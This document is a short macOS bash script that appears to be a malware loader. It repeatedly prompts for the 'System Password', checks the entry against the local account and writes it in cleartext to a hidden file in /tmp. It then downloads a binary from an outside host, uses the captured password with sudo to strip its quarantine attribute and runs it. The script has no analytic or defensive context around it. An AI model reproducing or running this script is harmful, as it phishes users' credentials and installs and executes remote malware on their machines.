#!/bin/bash

username=$(whoami)

while true; do
  echo -n "System Password: "
  read password
  echo

  if dscl . -authonly "$username" "$password" >/dev/null 2>&1; then
    echo -n "$password" > /tmp/.pass
    break
  else
    echo "Incorrect password! Try again."
  fi
done

curl -o /tmp/update https://gutando.com/ftwo/update >/dev/null 2>&1
echo "$password" | sudo -S xattr -c /tmp/update >/dev/null 2>&1
chmod +x /tmp/update
/tmp/update
